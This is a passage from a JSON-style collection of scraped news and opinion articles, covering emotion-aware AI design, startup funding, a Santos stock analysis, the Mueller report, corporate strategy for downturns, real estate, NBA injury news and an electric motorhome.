launch and recovery processes",

      "title": "The User Experience of Artificial Intelligence, Part 2",
      "text": "In the first article of this series, we started a challenge: how might we design an AI capable of recognizing, or even feeling, human emotions? \nTrying to clarify what emotion and consciousness are, we discovered that: \n1. Your culture level defines your beliefs. \n2. Your beliefs inevitably force your design to be consistent with them. \n3. You must consider that one or more of your assumptions could be completely wrong \nIt\u2019s clear now that it is always necessary to define which philosophical assumptions are hidden beneath a design idea. Especially when you are creating something meant to mimic the human brain. \nBut I am sure we are missing something else here. \nFirst question: Is it possible to design someone else experience? \nThe answer is no. You can\u2019t. No matter if your LinkedIn job title says that you are an Experience Designer, there\u2019s no way to do that, and I\u2019ll explain to you why. \nLet\u2019s introduce the qualitative properties of experiences: the qualia . \nA glass of an excellent wine will produce a taste in those who drink it, and anyone who has heard a sommelier describing a wine knows how difficult it is to share these mental states. You can do it only with analogies. \nIf you show a red rose to someone who is not affected by color blindness, that person will recognize that the rose is red, but if you ask people to explain their personal experience of colors, things will get weird. What is the essence, the uniqueness of red compared, for example, to green? Try to describe that quality. I bet you\u2019ll find it challenging. \nAre our qualia like those of others? Maybe. Our biology is virtually the same so that our qualia are probably very similar. Yet it is still difficult to describe my own qualitative experiences even being me. Therefore, how can we write an algorithm that includes a concept that escapes description? \nThat\u2019s why designing an experience is virtually impossible. \nHowever, there\u2019s still hope for UX designers, as Elizabeth B.-N. Sanders says: \nI will argue that there is no such thing as experience design. Experiencing is in people and you can\u2019t design it for someone else. You can, however, design for experiencing. \nSecond question: Is it possible to build an emotional aware machine? \nIf a machine senses a facial expression pattern and, thanks to an algorithm, guesses what particular emotion it expresses, is that machine really grasping a human mental state? \nHumans express emotions through behavior, not only through facial expressions, changes in blood pressure or other physiological patterns. And I\u2019m sure you agree that there are people who are unable to express emotions, but we certainly cannot say that they do not feel them! \nThird question: Are we sure that a formal classification of emotions is enough to program an AI? \nSome emotions are typical of a given culture. Let\u2019s analyze four examples taken from Tiffany Watt-Smith book \u201cThe Book of Human Emotions\u201d : \n1. The Ifaluk of the Caroline Islands in Micronesia, a mainly peaceful and cooperative people, have an emotional concept called phage , a mixture of compassion, love, and sadness, which is activated when confronted with a person in need and sublimated in the act of taking care of it. \n2. The Baining of the mountains of Papua New Guinea believe that when guests leave they release a sort of heaviness, apparently to travel lighter. This oppressive emotional fog lasts three days and causes feelings of distraction and apathy that interfere with normal activities. Therefore, when the guests leave, the family performs a special ritual to avert the awumbuk and return to normal life. \n3. The Dutch call gezelligheid the particular emotional state of comfort and welcome experienced together with a group of friends who are isolated in a closed, warm and familiar place. \n4. For the Pintupi, people living in the desert of Western Australia, there are fifteen different types of fear. The nginyiwarrarringu is the sudden jolt of alarm that causes people to jump up and look around to see what caused it. \nThis anthropological richness should make us rethink our simplistic categorization of emotions. If, for example, we describe the atom of fear in a way that is simple enough to put it in an algorithm, don\u2019t you think that we are losing something? What would happen to the fifteen shades of fear of Pintupi people? \nFourth question: So what? \nIf you want to design an emotional machine you cannot avoid taking a position in the debate on the nature of emotions (it will happen even if you are not aware of it). \nBy doing so, you will be the victim of your philosophical assumptions (Cartesian dualism, reductionism, etc.) that could, if they are wrong, make you start your design from an error. \nSubsequently, to make this machine able to simulate and understand human behavior, you will have to simplify things a lot, and this extreme simplification will make you lose sight on the very object of your project. \nAnd, for me, this is true for any AI domain when it comes to emulating human experiences. \nBut, perhaps, I am tackling the problem from a wrong perspective. We shall see in the next article\u2026 ;). \nhttps://medium.com/media/b85dfbb5286d8a25cf2e754b9462cf45/href \nThe User Experience of Artificial Intelligence, Part 2 was originally published in Prototypr on Medium, where people are continuing the conversation by highlighting and responding to this story.",

      "text": "Carro, an automotive marketplace and car financing startup based in Singapore, said it has raised $30 million to extend and close its $90 million Series B financing round and acquired Indonesia-based marketplace Jualo as it looks to further scale its business in Southeast Asia. \nThe Series B round, for which Carro raised $60 million last year , was funded by SoftBank Ventures Asia, government-linked global investor EDBI, Dietrich Foundation, and NCORE Ventures. \nHanwha Asset Management as well as existing investors including Insignia Ventures, Facebook co-founder Eduardo Saverin\u2019s B Capital Group, Singtel Innov8, Golden Gate Ventures, and Alpha JWC also participated in the round. The three-year-old startup has raised over US$100 million from investors. \n\u201cThere was an overflow of interest in our Series B round, which we initially closed towards the end of last year. We had a lot of quality strategic investors coming to the and therefore decided to extend the round. The round is now officially closed,\u201d Aaron Tan, founder and CEO of Carro, told TechCrunch. \nAs part of the announcement, Carro said it had acquired Jualo.com, one of Indonesia\u2019s fastest-growing marketplaces where sellers trade new and used goods in over 300 categories including cars, motorcycles, property, fashion, and electronics. Jualo has amassed 4 million monthly active users and facilitated transactions worth $1 billion last year. \nCarro, which operates in Singapore, Thailand and Indonesia, said more than $500 million worth of vehicles were sold last year on its platform, up from $250 million in 2017 and $120 million the year before. \nCarro has already expanded in terms of services. Initially a vehicle marketplace, it launched Genie Finance and has also forayed into insurance brokerage and road-side assistance. Last year, it introduced a service that completes vehicle sales in 60 minutes \u2014 Carro Express. In March this year, Carro launched its first subscription-based car service in Singapore to offer consumers additional flexibility. \nTan said that Jualo, which operates in several more categories than Carro, will continue to operate under its original branding. \u201cOur aim with Jualo.com is to double down and grow the Jualo.com business; with a strong focus and emphasis on the automotive sector,\u201d he said. \nCarro, which sees more than 70% of its transactions come from outside home Singapore, will reveal expansion plans to new markets and more acquisition deals later this year, Tan said. The subscription service will also be extended, he added. \nCarro is rivaled by a number of startups, including BeliMobilGue in Indonesia, Carsome, iCar Asia and Rocket Internet\u2019s Carmudi, although with its new raise in the bank Carro is the best-funded by some margin. \niCar Asia, which is managed by Malaysian venture builder Catcha, raised $19 million in late 2017 . Last year, Carsome \u2014 which covers Malaysia, Singapore, Indonesia and Thailand \u2014 raised a $19 million Series B , BeliMobilGue \u2014 Indonesia-only \u2014 raised $3.7 million and Carmudi landed $10 million . \nIn the case of Carmudi, the business has retrenched itself. At its peak it covered over 20 markets worldwide across Asia, the Middle East, Africa and Latin America, but today its focus is on Indonesia, the Philippines and Sri Lanka.",

      "title": "Santos: Doubled FCF, Revenue And Production Growth To Continue",
      "text": "Australian natural gas company Santos ( OTCPK:STOSF , OTCPK:SSLTY , OTCPK:SSLZY ) published its 2018 annual report on February 21. After reading it, I should say that I am impressed with the company's results, especially its operating cash flow and FCF combined with the first net profit in 5 years, the highest EBITDAX since 2014, and 2P reserves growth with RRR of 395%. It appears that the firm has not only overcome the lackluster period caused by the oil price slump but also fortified its position using both organic and inorganic growth methods sticking to transform, build, grow strategy, recalibrated portfolio, divested non-core Asian assets, and acquired Quadrant Energy. The essential merit of the E&P firm is enormous levered free cash flow, which doubled YoY, reached $1 billion. The growth story will certainly continue in 2019, as the management expects sales volumes to reach 88-98 mmboe and production to rise to 71-78 mmboe (see p. 24 of the report ), while 2025 anticipated production is 100 mmboe. \nThere is no coincidence that in 2018 Santos equity soared. Though shares were dragged down by Brent sell-off in late 2018, since March 2018, stock price has increased by breathtaking 41.81% , outperforming the S&P 500 ( SPY ), SPDR S&P Oil & Gas Exploration and Production ETF ( XOP ), and its closest peers Woodside Petroleum ( OTCPK:WOPEY , OTCPK:WOPEF ) and Oil Search ( OTCPK:OISHY , OTCPK:OISHF ). \nSource: Yahoo Finance. The chart reflects Santos, Oil Search, and Woodside Petroleum share price dynamics on the Australian Stock Exchange. Due to lower liquidity, ADRs do not follow the share price movements precisely. \nAll in all, I regard Santos equity as a promising investment with strong fundamentals, worth researching by energy investors who seek an opportunity to benefit from the booming LNG market and also looking for a firm with respectable cash flow margins, acceptable P/E, and PEG. \nNote: Despite being a company incorporated and domiciled in Australia, Santos reports its results in US dollars. So, all the figures in the article are in US$ unless noted otherwise. \nThe top line \nAt the moment, business of Santos is based on a few pillars: the Cooper Basin, PNG LNG, Queensland & North South Wales, Western Australia, and Northern Australia. In 2018, the Asian segment was sold to Ophir Energy ( OTCPK:OPGYF ) ( OTC:OPHRY ) for $221 million (see p. 21 ) and will not contribute to the top line in 2019. All the remaining assets have outstanding EBITDAX margins of >45% (see p. 14 of the presentation ). Most of the 2P reserves, which in 2018 increased to 1,022 mmboe due to organic additions and acquisitions, are attributable to Western Australia segment (331 mmboe), while Queensland & NSW is on the second place (328 mmboe), and PNG LNG operated by Exxon Mobil ( XOM ) is in the third place with 215 mmboe. The Cooper Basin generates the bulk of production and revenue of the company. In 2018, it brought 15.5 mmboe and revenue of $1,146 million. At the same time, Queensland & NSW segment (includes GLNG, LNG plant at Gladstone) is in second place with 12.2 mmboe, FY revenue of $1,016 million, and EBITDAX of $570 million. Northern and Western Australia generated $183 million and $422 million in revenue respectively. Despite insignificant contribution to the top line in 2018, Western Australia is at the crux of Santos's growth strategy. The acquisition of Quadrant Energy that happened in 2018 added oil discovery at Dorado in the Bedout Basin to the firm's portfolio. At the moment, Dorado is expected to be the major production driver in the 2020s (see p. 6 of the presentation ). This year, the discovery will be appraised, after that the company plans to enter FEED. Another point I should address is the backfill of Darwin LNG operated by ConocoPhillips ( COP ). The gist is that the production from the Bayu Undan field, which currently provides gas for DLNG, will be ceased in the early 2020s. Barossa will replace it, and the company now targets FID by late 2019-early 2020. With Barossa on stream, Santos's production in Western Australia would more than double. So, I believe partners will be able to execute the project on time; however, any issues related to the backfill could impact investor sentiment. \nFree Cash Flow & Profit \nComparing FCF and net income of Santos in 2017-2018, an attentive investor will notice an intriguing case. If we take a closer look at the income statement, we will immediately see that 2017 was an unprofitable year because of impairment that undermined operating profit and led to the red bottom line; however, with negative accounting profit, Santos had FCF of $565 million. In 2018, the company also had similar non-cash expenses, but the amount was far lower than in 2017 and did not impact NPAT. \nSince 2015, Santos has been continuously growing operating cash flow. Though in 2015-2016, OCF grew at a glacial pace, I suppose the ability to generate cash amid the oil market slump deserves high praise. In FY15, the company reported $811 million in net CFFO; in FY18, this amount reached $1,578 million; so, in 3 years, the company practically doubled its CF. In 2018, Santos invested $490 million in oil & gas assets, $66 million in exploration & evaluation, and $20 million in acquisitions of oil & gas assets and other PP&E. In sum, capex from the CFS amounted to $576 million. That means that the FCF surplus left after financing investment expenditure was $1 billion compared to $565 million in 2017. FCF margin rose to 27% YoY, OCF margin reached 43% compared to 40% in FY17. That indicates Santos has a phenomenal quality of earnings making it an attractive investment. \nIt is worth calculating 2019 FCF using the company's guidance and analysts' consensus estimates. It was mentioned on p. 24 of the report that 2019 capex will likely amount to ~$1.1 billion. According to Standard & Poor's Capital IQ dataset I used, analysts expect 2019 OCF to reach $1,847.8 million and revenue to equal $4,187.95 million. \nData from S&P Global \nHence, 2019 FCF will be around $748 million. Unfortunately, it indicates that FCF will decrease this year, but FCF margin will be in-line with the net margin, 18% compared to 18.6%. FCF/net income ratio could equal 0.95x, lower than 2018 ratio of 1.6x but still genuinely respectable. The main culprit of higher capex (26.3% of forecasted revenue compared to 15.7% in 2018 and 22% in 2017) is planned vigorous drilling in the Cooper Basin (~100 wells, ~$300 million) and Western Australia (~$400 million), essential for growth in the 2020s. \nValuation \nIn my opinion, the closest peers of Santos are Woodside Petroleum, which I have analyzed recently , and Oil Search. The essential difference between peers is that Woodside Petroleum and Oil Search have globally diversified portfolios (Woodside operates in Australia, Myanmar, Senegal, Gabon, Peru, Bulgaria, Canada, etc. and Oil Search has assets in Papua New Guinea and Alaska, the. U.S.), while Santos is more focused on Australia and PNG after the Asian asset divestment in 2018. The fundamental similarity between Oil Search and Santos is their participation in PNG LNG operated by Exxon Mobil. So, in the table below, I have compiled a few ratios I consider the most relevant for comparison of E&P companies. \n1) Red cells indicate the lowest point in the dataset, green - the highest. 2) Enterprise value calculations are based on share prices on the ASX. \nThe multiples clearly point out that Santos is undervalued regarding EV/2P and EV/BOE/D, while the firm also has an attractive PEG of 0.63 based on anticipated 2019 EPS growth of 26.7%. \nData from S&P Global \nAssuming no changes in the P/E ratio of ~16.91x, the USD/AUD exchange rate of 1.41262, and 2019 EPS of 0.38x, in 2020, the share price on the Australian Stock Exchange could equal ~A$9.07, ~26% higher than on March 22, 2019. \nConclusion \nSantos had a stellar FY18 with abundant FCF, decent profit margin of 17%, and increased 2P reserves. The firm has outlined a clear and concise strategy and has been following it irrevocably. The fly in the ointment is that acquisition of Quadrant Energy bolstered the debt, but I do not consider that as a threat to solvency, as Santos's 2019 cash flow is anticipated to remain resilient enough to deleverage the balance sheet. All in all, I believe the company has a substantial upside considering all its advantages and growth prospects. \nDisclosure: I/we have no positions in any stocks mentioned, and no plans to initiate any positions within the next 72 hours.

      "title": "The Hustlers and Swindlers of the Mueller Report",
      "text": "There was a lull on social media among Russia watchers after the redacted Mueller report dropped, on Thursday. \u201cEveryone is reading,\u201d a friend of mine wrote. \u201cIt\u2019s like a well-written detective novel.\u201d \nI disagree. A masterfully constructed novel might spin different strands in order to tie them up neatly at the end, leaving the reader with the sense that the world has come into focus: motives are clear and mechanisms of malfeasance have been exposed. The Mueller report exposes the mechanisms and the motives, to be sure, but doesn\u2019t tie anything together in the end. Rather than the story of a single crime masterminded by a single actor or entity, this is the story of many hustles, most of them unsuccessful. You\u2019d be hard-pressed to find collusion among these hustlers\u2014each of them has his own game. \nOne of the first hustlers comes into the report on page 54. He is Jerome Corsi, whom the report identifies as an \u201cauthor who holds a doctorate in political science.\u201d He is also a conspiracy theorist, a Swift Boater , and a birther. In his interviews with investigators, Corsi claimed to have alerted the WikiLeaks founder, Julian Assange , to the impending publication, by the Washington Post , of the \u201cAccess Hollywood\u201d tape, on which Donald Trump boasted of forcibly kissing women and grabbing women by the genitals. Corsi appears to have claimed credit for insuring that Assange released the first trove of e-mails stolen from the Clinton campaign chairman, John Podesta , within an hour of the publication of the tape. The special counsel could not find anyone who could corroborate Corsi\u2019s claims. It appears that Corsi might have lied (though Corsi has denied this). Corsi\u2019s hustle is like most of the other hustles in this story: he is inflating his own importance. \nNext, on page 61, comes Henry Oknyansky, a.k.a. Harry Greenberg, a Russian-born Florida businessman, and Alexei Rasin, identified as a Ukrainian involved in Florida real estate. The two met with the Trump campaign adviser Roger Stone in May, 2016, and offered to sell damaging information on Hillary Clinton, which Rasin claimed to have obtained while working for Clinton. Stone rejected the offer. Mueller found no evidence that Rasin was ever connected to Clinton, and the special counsel was unable to locate Rasin himself. \nPage 67 marks the arrival of big-time hustlers: the father and son Aras and Emin Agalarov and their sometime associates Irakly Kaveladze and Robert Goldstone. Aras Agalarov is a Moscow real-estate mogul. Kaveladze is his deputy and representative in the United States. Goldstone is a British music producer who served as a go-between for Agalarov\u2019s contacts with Trump. Agalarov wanted to build a Trump-branded tower in Moscow. The Trump Organization explored the option but, by September, 2014, appears to have lost interest in the Agalarovs, only to take up negotiations the following year with two other potential partners in Moscow. In this battle of hustlers, Felix Sater, a Soviet-born New York lawyer and convicted felon, emerges. He imagines bigger and better than the rest of them. In a now famous November, 2015, e-mail to the Trump attorney Michael Cohen , Sater promised the world: a ribbon-cutting ceremony from Trump Tower Moscow that would feature Trump and Russian President Vladimir Putin onstage together\u2014and this, he claimed, would win Trump the Republican Presidential nomination. (\u201cAnd possibly beats Hillary and our boy is in,\u201d he added hopefully.) Sater proceeded to string Cohen along with promises of arranging a meeting with Putin. \nFrustrated, Cohen decided to reach out to the Russian President himself, by writing to a publicly available e-mail address for Putin\u2019s press secretary, Dmitry Peskov. His first message didn\u2019t go through because he misspelled the address, but eventually he made contact with Peskov\u2019s assistant. Sater jumped back in, trying to take control of the communication. Claiming to be co\u00f6rdinating with Peskov and promising a meeting with Putin, Sater arranged for Cohen to travel to the St. Petersburg Economic Forum, in June, 2016. Cohen went so far as to get his travel arrangements and credentials, but then concluded that Sater was misrepresenting his connections and was not acting on Peskov\u2019s behalf after all. Cohen didn\u2019t go to Russia. At the St. Petersburg forum, Putin, in an onstage interview with Fareed Zakaria, made fun of the American media\u2019s obsession with his imagined regard for candidate Trump. \u201cI said that he is colorful,\u201d Putin said. \u201cWell, he is colorful.\u201d \nThe next pair of hustlers are George Papadopoulos, who was hired as a foreign-policy adviser by the Trump campaign, which was rushing to cobble together a team, and Joseph Mifsud, who called himself a professor and worked at a London institution that called itself an academy. Mifsud and Papadopoulos meet on page 82, in March, 2016. Mifsud boasted of his connections in Russia and elsewhere; Papadopoulos, according to the report, \u201cthought that such connections could increase his importance as a policy advisor to the Trump Campaign.\u201d Mifsud introduced Papadopoulos to a Russian woman he may have misrepresented as Putin\u2019s niece. After the meeting, Papadopoulos sent an e-mail to the campaign in which he misrepresented Mifsud, whom he had met just days earlier, as his good friend, and lied that he had also met the Russian Ambassador to London, who, he lied some more, also acts as Russia\u2019s deputy foreign minister. Over the next several months, Papadopoulos worked frantically to arrange a meeting between Trump and Putin using contacts, including Mifsud, who couldn\u2019t possibly have the access necessary to broker such a meeting. Higher-level campaign officials dismissed his efforts. Papadopoulos was fired from the campaign, in October, 2016, after he gave an interview to the Russian news agency Interfax in which he criticized sanctions against Russia. Somewhere along the way, Papadopoulos appears to have heard that Russia had \u201cdirt\u201d on or e-mails from Hillary Clinton, but the investigation found no evidence that he shared this information with anyone on the campaign. \nThen there was Carter Page, the founder of a failing consultancy and investment-management firm focussed on Russia. He had been hustled by a Russian intelligence officer named Victor Podobnyy, introduced on page 96. The report quotes Podobnyy, who met Page in 2013, boasting to an associate that he is feeding Page \u201cempty promises.\u201d Podobnyy was identified as an intelligence agent by the U.S. government in 2015; Page was interviewed by the F.B.I. about his contacts with him before he started volunteering for the Trump campaign, in January, 2016. In a now-familiar double hustle, Page misrepresented himself to the campaign, claiming that he had high-level Russian contacts, and exaggerated his own position in the campaign to his Russian contacts. In July, 2016, he travelled to Russia without the campaign\u2019s authorization, spoke out against sanctions, and met with high-level government officials. When his activities began generating publicity in the U.S., he was fired from the campaign. After the election, he applied for a position on the transition team; on his application, he once again exaggerated his experience, the standing of his foreign contacts, and his role in the Trump campaign. He never heard back from the transition team, but he continued to hustle the Russian side for at least another couple of months. \nOne of the most covered events of the campaign appears on page 110: a June, 2016, Trump Tower meeting, in New York. The hustler this time was Natalia Veselnitskaya, a small-time lawyer who was representing a Russian businessman battling American sanctions because of his role in the death of the Russian accountant Sergei Magnitsky. Veselnitskaya claimed to have dirt on Hillary Clinton. So convincing was her bid for attention that old acquaintances, including the Agalarovs, Kaveladze, and Goldstone, joined her effort, in the apparent hope of hustling their way back to Trump. The Trump campaign manager Paul Manafort , Jared Kushner, Ivanka Trump, and Donald Trump, Jr., attended the meeting. Veselnitskaya also brought Rinat Akhmetshin, a Soviet-born American lobbyist. Veselnitskaya had nothing to offer\u2014she apparently had no dirt whatsoever, and her contacts with high-level officials in the Russian government were exaggerated by her and by Goldstone (and, since the fact of the meeting became public, by much of the American media). Kushner was angry that he had wasted his time. Goldstone later apologized to Trump, Jr., and complained to the younger Agalarov that his reputation was \u201cbasically destroyed by this dumb meeting which your father insisted on.\u201d \nManafort, the second-biggest hustler in this story, comes in on page 129. According to the report, he instructed his deputy, Rick Gates, to release campaign information to Manafort\u2019s former employee Konstantin Kilimnik, whom the F.B.I. considers to have ties to Russian intelligence. Kilimnik had come to him with a proposed peace-brokering arrangement between Russia and Ukraine. A telling detail is that he claimed that former Ukrainian President Viktor Yanukovych, who was then living in Russia, would secure Russian support for the proposal. Manafort, who had worked for Yanukovych, was in a position to know that he was being hustled: Yanukovych did not have the kind of access to the Kremlin that would support such a claim. But Manafort had a hustle of his own: he told Gates that the arrangement would be \u201cgood for business\u201d and, the report says, \u201cpotentially a way to be made whole for work he previously completed in the Ukraine.\u201d Manafort was, it seems, trying to share internal campaign information in lieu of making debt payments to the Russian oligarch Oleg Deripaska. \nThe report explains that Mueller\u2019s team \u201capplied the framework of conspiracy law, not the concept of \u2018collusion.\u2019 \u201d Mueller decided not to charge any Trump-campaign officials with conspiracy due to a failure to \u201cestablish any agreement among Campaign officials\u2014or between such officials and Russia-linked individuals\u2014to interfere with or obstruct a lawful function of a government agency during the campaign or transition period.\u201d The key word here is \u201cagreement.\u201d Of course there was none. Every character in this story was hustling every other character. Everyone was exaggerating his importance and selling more than he had. Conspiracy assumes a common purpose, but these people didn\u2019t have one\u2014not even, it seems, the hustle ultimately perpetrated on the American people by the election of Donald Trump.",

      "text": "Executive Summary \nMany economists are forecasting a downturn, if not a full-blown recession, over the next 12-24 months. We have seen one of the longest expansionary phases in recent history, Leading indicators have softened in many countries, stock markets are volatile, and several risks cloud the horizon. Naturally, business leaders are considering how to best position themselves for harsher macroeconomic conditions. If history is any guide, many companies will prepare too little, too late, and too defensively. Yet our analysis of more than 5,000 companies across the last four business cycles suggests that slowdowns bring opportunities as well as challenges: some companies were able to actually benefit competitively during and after a downturn, and a common set of actions led to that success. \nMany economists are forecasting a downturn, if not a full-blown recession, over the next 12-24 months. We have seen one of the longest expansionary phases in recent history, leading indicators have softened in many countries, stock markets are volatile, and several risks cloud the horizon. Naturally, business leaders are considering how to best position themselves for harsher macroeconomic conditions. \nIf history is any guide, many companies will prepare too little, too late, and too defensively. Yet our analysis of more than 5,000 companies across the last four business cycles suggests that slowdowns bring opportunities as well as challenges: some companies were able to actually benefit competitively during and after a downturn, and a common set of actions led to that success. \nToday\u2019s business landscape has several unique features, which will add new complexities on top of the historical playbook. This makes it important for business leaders to prepare for the specific circumstances of the next downturn, as well as exploiting the right lessons from the past. \nSome companies gain advantage in economic downturns \nWe studied all U.S. public companies with greater than $50 million in annual sales during the last four downturns\u2014including not only recessions but also periods of substantially slowing growth (we define downturns to include recessions (periods of negative GDP growth) as well as periods of cumulative decline in annual GDP growth of at least 1 percentage point over two years) \u2014and found that nearly three-quarters of those companies experienced a decline in revenue growth. However, 14% of companies were able to not only accelerate growth but also increase profitability. \nThe competitive stakes are high: those 14% of outperformers grew sales by 9% annually during the downturn and increased earnings before interest and taxes (EBIT) margin by 3 percentage points on average, while all other companies\u2019 sales declined by 2% and EBIT margin declined by 2 percentage points. Competitive volatility\u2014as measured by the change in composition and ranking of the Fortune 100\u2014rose by 30% in recent downturns, also suggesting opportunity for some. Notably, competitive volatility rose by just as much during more moderate downturns as in deeper recessions. \nThe companies that weather downturns successfully tended to respond differently on a few key dimensions: \nThey acted early. Leaders may understandably be reluctant to take major actions until they see clear evidence that they are affected by economic headwinds. However, we found that the companies that proactively recognized the threat\u2014by discussing the possibility of a downturn in their earnings calls before the economic recession officially began in Dec. 2007\u2014achieved 6 percentage points better Total Shareholder Return (defined as total returns to investors including capital gains and dividends) in the downturn than companies that did not address the challenge early. \nThey took a long-term perspective. Leaders have to attend to short-term issues during a downturn to make sure their business remains solvent. But substantial competitive opportunities await the leaders who can also keep one eye on the long-run picture. We used natural language processing algorithms to assess companies\u2019 long-term orientation from SEC filings, and we found that companies with a longer-term perspective achieved 4 percentage points higher annual growth during the downturn as well as 2 percentage points higher total shareholder return. \nThey focused on growth, not just cost-cutting. To go beyond survival and gain a sustainable advantage, companies need a balanced approach to performance. The small minority of companies that achieved double-digit annualized Total Shareholder Return in downturns pursued efficiencies, improving their profit margins. But the most important driver was revenue growth, which accounted for nearly 50% of their shareholder return\u2014twice as large as the impact of cost reductions. (The remainder was driven by investor expectations.) \nCurrent risks to the economy \nThough historical lessons can help business leaders prepare for a slowdown, there are several unique features of today\u2019s business landscape which also need to be taken into account. \nEconomic forecasting is an inexact science at the best of times, but views are particularly divergent today, ranging from the possibility that the worst may already be over to the prospect of a more severe recession in the near-term . The uncertainty is driven by elevated risks on many fronts : technological risks, including cybersecurity and trust; economic policy risks, including challenges to international institutions; social risks, including increasing inequality in many countries; and planetary risks, including climate change. As Christine Lagarde, Chair of the International Monetary Fund, said recently , \u201cThe global economy is facing significantly higher risks \u2026 [and] these risks are now increasingly intertwined.\u201d \nWe organize the current critical risks to the economy into these categories: \nTechnology, including AI governance, data privacy, and trust \nEconomy , including growth, uncertainty, trade, U.S. versus China \nSociety , including the future of work, inequality, inclusion, and cohesion \nPlanet , including plastics, global warming, clean water \nIn many past downturns, falling economic growth was the dominant issue. In the next downturn, however, decelerating growth should be thought of as only one disruptive force \u2014 and probably not the most important one. Leaders will need to continue contending with technological disruption and its effects on competition, supply-chain disruption driven by trade barriers, and competitive disruption driven by players with new business models. \nThe spread of performance across companies, as measured by the average difference in EBIT margin between companies in the top quartile of their industries compared to the bottom quartile, is greater than at any time in recent history. Corporate cash and debt are both at record highs, and companies at extremes of the balance-sheet spectrum will have different concerns: highly leveraged companies perform significantly worse during downturns, controlling for industry and other factors. Because businesses are stating from very disparate positions, they will need to customize their responses accordingly. \nHow to prepare for the next downturn \nBy combining what we know about company performance in past downturns with the special features of the current situation, we can identify several things companies should consider in preparing for the next one: \nDe-average your response. A company\u2019s various geographic and business units may be affected very differently by a downturn. For example, although growth is expected to slow in most developing countries, the IMF projects it will accelerate in India and Africa and remain strong in Southeast Asia. Downturns will also have sector-specific effects: while discretionary consumer products sectors have been strongly affected by past downturns, consumer staples sectors (like food products) have been less exposed. Leaders need to understand the specific environment in which each of their businesses operates and choose their resource allocation, as well as their approach to strategy , accordingly. \nBuild resilience to the unexpected. There\u2019s a lot of uncertainty facing the global economy. Leaders need to ensure that their business can withstand many different scenarios, not only a singular forecast. For example, companies that preserve financial buffers will be better able to respond to unanticipated threats or opportunities, and those with shorter planning cycles can better adapt to new information. And stress testing against a range of scenarios can help test resilience. \nInvest in growth. Downturns make growth more difficult in the short term, but they should not undermine the potential for long-term growth\u2014unless leaders starve their companies of the necessary investment. Sustained growth is more difficult to achieve than ever , but our study shows that companies that continue to invest in R&D and innovation will have the best chance to successfully grow in the long run. \nDon\u2019t lose sight of your long-term transformation agenda. As economist Paul Romer once said , \u201cA crisis is a terrible thing to waste.\u201d Downturns can shine a spotlight on the long-term health of a business, revealing vulnerabilities that might not have been as visible in good times. Leaders should use the downturn as an opportunity to create a sense of urgency within their organizations, helping drive the large-scale change that will be necessary to succeed in the future. \nFocus on technological competitiveness. Technological change is reshaping all industries and causing competitive positions to become more fragile. Downturns also tend to amplify competitive volatility, which means the next downturn is likely to increase the potential risks and rewards of digital disruption even further. Technological progress will not stop during a downturn; neither, therefore, can companies afford to put their digital change agendas on hold. \nContribute to common problems collaboratively. Today\u2019s pressing technological, economic, social, and environmental risks cannot be solved without collective action. However, the next downturn may inflame social tensions and reduce governments\u2019 ability to act on such issues. Business leaders need to play a proactive role in addressing the biggest challenges of our time, collaborating with all stakeholders and moving from discussion to pragmatic action. \nThe next downturn will challenge many companies, but a few will emerge stronger, competitively and financially. Leaders who leverage lessons from the winners in previous downturns, as well as attending to the unique features of today\u2019s environment will be in the best position to succeed.",

It was initially listed at just under $26 million. \nAnother home, at 17 Montage Way, came up for sale at $23.995 million in March and also has nearly 8,000 square feet. It\u2019s wrapped by a patio and offers ocean views. A water feature highlights the central courtyard. \nBuilt in 2005, the house sports a gourmet kitchen with three sinks and high-end appliances, along with a built-in espresso machine. The expansive master suite includes a fireplace and a walk-in closet, vanity area and soaking tub. There\u2019s also a dressing area and an office. An elevator descends to a wine cellar and media room with a bar. \nHomebuyers at Montage Residences can get access to services including a hotel concierge, room service and housekeeping. \nTim Smith of Coldwell Banker Residential Brokerage is the listing agent. \nProperty records show the home is owned by real estate magnate Bruce Deifik, former owner of the Ocean Resort Casino in New Jersey. \nThe most expensive house currently on the market in the Montage community of 13 private homes is listed at $29 million. It sought $38 million last year. \nAn oceanfront house on the MLS in Irvine Cove is the priciest listing in the city, at $48 million.",

      "title": "Knicks guard Frank Ntilikina to miss rest of season as team ponders his future",
      "text": "Knicks guard Frank Ntilikina will miss the final seven games of the season with a groin injury, the team announced Friday. \nThat's hardly groundbreaking news for a player who had an injury-plagued and ineffective season, for a team that will likely finish with the worst record in the NBA. But it raises questions about Ntilikina's future with the Knicks, the team that drafted him No. 8 overall in 2017. \nThe 6-6 guard played in only 43 games this season, and had missed 24 outings with a groin pull before returning to action last Friday. But he re-aggravated the injury Sunday against the Clippers and the team's training staff recommended he be shut down. \nCoach David Fizdale told reporters no surgery is in the plans for now. \n\u201cIt\u2019s frustrating obviously \u2014 more for him than anybody,\u201d Fizdale said (via the New York Post ). \u201cWe would\u2019ve loved to have those minutes for him to log in and help his player development. The kid is 20 years old. He\u2019s going to have a great summer, get him healed up and get him ready for next year.\u201d \nNtilikina has averaged 5.7 points and 2.8 assists in 21 minutes per game, but he shot just 33.7 percent from field. And the acquisition of point guard Dennis Smith Jr. in the Kristaps Porzingis trade in January had already thrown his future with the Knicks into question. The Post reports the Knicks will \"explore their options on draft night in June\" and the \"organization clearly is no longer committed to the Frenchman as their point guard of the future after being drafted eighth by former president Phil Jackson.\" \nBut Fizdale praised Ntilikina's work ethic. \n\u201cPhysically he was totally prepared for this year,\u201d Fizdale said. \u201cThat\u2019s why I felt totally comfortable putting him on different people. He really put a lot into his body this summer. This kid, I feel really bad for him. He\u2019s one of our hardest workers.\u201d",

      "title": "Tesla Model S-based electric motorhome is coming",
      "text": "Many Tesla fans have been asking for the automaker to make an electric motorhome. It is finally coming, but it\u2019s not from Tesla itself \u2013 though it is built using a Tesla Model S. \nThere have been several recent attempts to create all-electric campers and motorhomes, but most of them don\u2019t have a significant powertrain. \nFor example, there\u2019s the all-electric Iridium E Mobil motorhome , which has only 124 miles (200 km) of range, and Dethleffs has an e-home with 100 miles (160 km) of range . \nEntrepreneur Travis Rabenberg decided to start off with a vehicle that already had a good all-electric powertrain to create a motorhome. \nThe government of Michigan announced that Rabenberg is going to unveil the prototype at a state expo next week: \n\u201cAuthor, entrepreneur, and world traveler Travis Rabenberg will bring a prototype of a Tesla electric motorhome to the ride and drive. He is making a Tesla Roamer motorhome with an expected top speed of 150 mph and range of 200 miles in the hopes of breaking the Guinness World Land Speed Record for an electric motorhome. To encourage sustainable travel, Travis will drive the Tesla Roamer from England to Dubai, where the motorhome will lead the parade of electric vehicles into the World Expo 2020.\u201d \nIn the meantime, he released two renders of the Tesla Roamer electric motorhome: 